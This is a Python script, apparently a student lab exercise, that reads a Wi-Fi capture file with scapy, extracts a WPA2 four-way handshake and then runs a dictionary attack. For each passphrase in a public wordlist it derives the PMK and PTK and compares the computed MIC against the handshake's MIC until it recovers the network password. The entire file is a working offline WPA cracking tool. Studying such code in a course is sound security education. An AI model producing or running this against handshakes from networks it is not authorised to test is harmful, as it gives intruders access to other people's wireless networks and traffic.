#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
Auteurs: Thomann Yanick, Galley David, Gachet Jean
Date: 30/04/2023

Liste de mots utilisée trouvée ici: https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/WiFi-WPA/probable-v2-wpa-top4800.txt
Note: ajouté "actuelle" en 1500ème position.

Derive les clés WPA depuis un mot de passe et les infos d'un 4-way handshake

Calcule un MIC d'authentification (le MIC pour la transmission de données
utilise l'algorithme Michael. Dans ce cas-ci, l'authentification, on utilise
sha-1 pour WPA2 ou MD5 pour WPA)
"""

import hashlib
import hmac
from binascii import a2b_hex, b2a_hex
from scapy.all import *
from pbkdf2 import *


key_infos = [0x008a, 0x010a, 0x13ca, 0x030a]


def is_data_from_ds(pkt):
    if pkt.haslayer(Dot11) and pkt.type == 2:  # data packets
        ds = pkt.FCfield & 0x3  # DS bits in the frame control field
        to_ds = ds & 0x1 == 1  # 1st bit is to DS
        from_ds = ds & 0x2 == 1  # 2nd bit is from DS
        return not to_ds and from_ds


def is_data_to_ds(pkt):
    if pkt.haslayer(Dot11) and pkt.type == 2:  # data packets
        ds = pkt.FCfield & 0x3  # DS bits in the frame control field
        to_ds = ds & 0x1 == 1  # 1st bit is to DS
        from_ds = ds & 0x2 == 1  # 2nd bit is from DS
        return to_ds and not from_ds


def get_key_info(pkt):
    if pkt.haslayer(EAPOL):
        payload = pkt[EAPOL].load
        return struct.unpack("!H", payload[1:3])[0]


def get_next_line_from_file(filename):
    """
    This function yields one line at a time from the given file.
    """
    with open(filename, 'r') as file:
        for line in file:
            yield line.strip()


def get_handshakes(pcap):
    # 1. Get all SSIDs in the capture, and their associated AP MAC addresses
    # Initialize an empty dictionary
    ssids = {}
    # Iterate over all packets in capture
    for pkt in pcap:
        # If the packet is a 802.11 beacon or association request
        if pkt.haslayer(Dot11Beacon) or pkt.haslayer(Dot11AssoReq):
            # Retrieve the SSID
            ssid = pkt[Dot11Elt].info.decode()
            # Add AP to dict if not seen before
            if ssid not in ssids:
                ssids[ssid] = pkt.addr3

    # 2. Try and find a complete 4-way handshake for each SSID
    handshakes = {}
    for ssid in ssids:
        handshake = []
        hs_pkt = 0  # handshake message number (0 indexed)
        ap_mac = ssids[ssid]
        cl_mac = ""
        for pkt in pcap:
            # check if the packet is a WPA key packet from the AP
            if pkt.haslayer(EAPOL):
                # is it the 1st message of a 4-way handshake for the given ssid ? (from AP to client)
                if hs_pkt == 0 and get_key_info(pkt) == key_infos[hs_pkt]\
                        and pkt.addr2 == ap_mac:
                    cl_mac = pkt.addr1
                    handshake.append(pkt)
                    hs_pkt += 1
                # is it the 2nd message ? (from client to AP)
                elif hs_pkt == 1 and get_key_info(pkt) == key_infos[hs_pkt]\
                        and pkt.addr1 == ap_mac and pkt.addr2 == cl_mac:
                    handshake.append(pkt)
                    hs_pkt += 1
                # is it the 3rd message ? (from AP to client)
                elif hs_pkt == 2 and get_key_info(pkt) == key_infos[hs_pkt]\
                        and pkt.addr1 == cl_mac and pkt.addr2 == ap_mac:
                    handshake.append(pkt)
                    hs_pkt += 1
                # is it the 4th message ? (from client to AP)
                elif hs_pkt == 3 and get_key_info(pkt) == key_infos[hs_pkt]\
                        and pkt.addr1 == ap_mac and pkt.addr2 == cl_mac:
                    handshake.append(pkt)
                    hs_pkt += 1
                    handshakes[ssid] = handshake
                    break  # we found a whole 4-way handshake for this ssid
                else:
                    print("No 4-way handshake found for {}".format(ssid))

    return ssids, handshakes


def custom_prf512(key, A, B):
    """
    This function calculates the key expansion from the 256 bit PMK to the 512 bit PTK
    """
    blen = 64
    i = 0
    R = b''
    while i <= ((blen * 8 + 159) / 160):
        hmacsha1 = hmac.new(key, A + str.encode(chr(0x00)) + B + str.encode(chr(i)), hashlib.sha1)
        i += 1
        R = R + hmacsha1.digest()
    return R[:blen]


if __name__ == '__main__':

    # Read capture file -- it contains beacon, authentication, association, handshake and data
    wpa = rdpcap("wpa_handshake.cap")

    # Get all 4-way handshakes in the pcap
    ssids, handshakes = get_handshakes(wpa)

    for ssid in ssids:
        if ssid not in handshakes.keys():
            break

        print("----- Start hacking of {} -----".format(ssid))
        handshake = handshakes[ssid]

        # getting AP and client MAC from message 1
        ap_mac = a2b_hex(handshake[0].addr2.replace(':', ''))
        client_mac = a2b_hex(handshake[0].addr1.replace(':', ''))

        # Authenticator and Supplicant Nonces
        key_data = handshake[0][EAPOL].load  # AP nonce is in the 1st message
        ap_nonce = a2b_hex(key_data[13:45].hex())
        key_data = handshake[1][EAPOL].load  # client nonce is in the 2nd message
        client_nonce = a2b_hex(key_data[13:45].hex())

        # This is the MIC contained in the 4th frame of the 4-way handshake
        key_data = handshake[3][EAPOL].load
        mic_to_test = key_data[-18:-2].hex()

        # Computing necessary values
        a = b"Pairwise key expansion"  # this string is used in the pseudo-random function
        b = min(ap_mac, client_mac) + max(ap_mac, client_mac) + min(ap_nonce, client_nonce) + max(ap_nonce, client_nonce)

        # Data on which to compute the MIC
        dot11_version = b"\x01"  # 802.1X-2001
        dott11_type = b"\x03"  # key
        message4_len = b"\x00\x5f"  # 95 bytes
        payload = handshake[3][EAPOL].load
        payload = payload[0:-18] + b"\x00" * 16 + payload[-2:]  # putting MIC to 0
        data = a2b_hex(dot11_version.hex() + dott11_type.hex() + message4_len.hex() + payload.hex())

        passphrases_filename = "probable-v2-wpa-top4800.txt"
        for passphrase in get_next_line_from_file(passphrases_filename):
            # derives the PMK and then the PTK
            pmk = pbkdf2(hashlib.sha1, str.encode(passphrase), str.encode(ssid), 4096, 32)
            ptk = custom_prf512(pmk, a, b)

            # PTK = KCK|KEK|TK|MICK
            kck = ptk[0:16]

            # calculate MIC over EAPOL payload (Michael)
            # as seen with the assistant, the output of hmac here is too large, taking only the first 32 bytes
            mic = hmac.new(kck, data, hashlib.sha1).hexdigest()[0:32]
            if mic == mic_to_test:
                print("The passphrase for \"{}\" is {}".format(ssid, passphrase))
                exit()

        print("The passphrase for \"{}\" was not found in the file.".format(ssid))
